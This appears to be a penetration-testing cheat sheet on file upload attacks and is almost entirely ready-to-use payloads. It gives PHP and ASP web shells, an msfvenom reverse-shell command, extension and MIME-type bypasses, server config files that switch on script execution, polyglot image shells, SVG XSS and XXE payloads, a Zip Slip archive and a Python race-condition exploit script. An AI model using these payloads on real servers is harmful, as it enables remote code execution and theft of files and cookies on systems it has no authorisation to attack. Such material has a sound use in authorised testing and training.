title: File Upload Attacks
html:
File Upload Attacks

Web Shells

Basic PHP File Read

<?php file_get_contents('/etc/passwd'); ?>

Basic PHP Command Execution

<?php system('hostname'); ?>

Basic PHP Web Shell

<?php system($_REQUEST['cmd']); ?>

Basic ASP Web Shell

<% eval request('cmd') %>

Generate PHP reverse shell

msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php

Bypasses

Toggle Page Inspector

[CTRL+SHIFT+C]

Uncommon Extension

shell.phtml

Case Manipulation

shell.pHp

Double Extension

shell.jpg.php

Reverse Double Extension

shell.php.jpg

Character Injection - Before/After Extension

`%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`

Limited Uploads

HTML, JS, SVG, GIF

XSS

XML, SVG, PDF, PPT, DOC

`XXE`/`SSRF`

ZIP, JPG, PNG

DoS

PHP Extension Alternatives

When .php is blocked, try these alternatives (server-dependent):

Old/versioned PHP

`.php3` `.php4` `.php5` `.php7` `.php8`

PHP HTML template

.phtml

PHP Archive

.phar

SSI + PHP on some configs

.shtml

Often not blocked

.inc

Drupal convention

.module

Case variation (Windows / case-insensitive servers)

`.pHp` `.PhP` `.PHP`

Server Config File Tricks

.htaccess (Apache — enables PHP execution in upload dir)

AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png

Upload this as .htaccess, then upload shell.jpg containing PHP code.

.user.ini (PHP-FPM / CGI — auto-prepend)

auto_prepend_file=shell.jpg

Upload as .user.ini, then upload shell.jpg with <?php system($_GET['cmd']); ?>. Takes effect after PHP's cache TTL (default 5 min).

web.config (IIS — execute ASP from any extension)

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.php" verb="*" modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll"
              resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".php" />
            </fileExtensions>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>

Polyglot Payloads

GIF + PHP (bypasses magic bytes check)

echo 'GIF89a' > shell.php.gif
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.gif

Or with exiftool (embed in a real image):

exiftool -Comment='<?php system($_GET["cmd"]); ?>' legitimate.jpg -o shell.php

SVG XSS

<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>

SVG XXE (read local files)

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>

ZIP Path Traversal (Zip Slip)

# Create malicious zip that extracts shell.php outside the target directory
zip exploit.zip ../../../../var/www/html/shell.php

MIME Type Spoofing

Change Content-Type header in Burp to a trusted type while uploading PHP:

Content-Type: image/jpeg

Magic Bytes Bypass

Prepend valid magic bytes to PHP file to fool content-type validators:

FF D8 FF

ÿØÿ

89 50 4E 47

‰PNG

47 49 46 38

GIF8

25 50 44 46

%PDF
printf '\xff\xd8\xff\xe0' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

Upload Race Condition

If the server validates then moves the file, exploit the race window:

import requests, threading

url = 'http://TARGET/upload'
shell_url = 'http://TARGET/uploads/shell.php?cmd=id'

def upload():
    while True:
        requests.post(url, files={'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')})

def trigger():
    while True:
        r = requests.get(shell_url)
        if 'uid=' in r.text:
            print(r.text)
            break

t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=trigger)
t1.start(); t2.start()
t1.join(); t2.join()
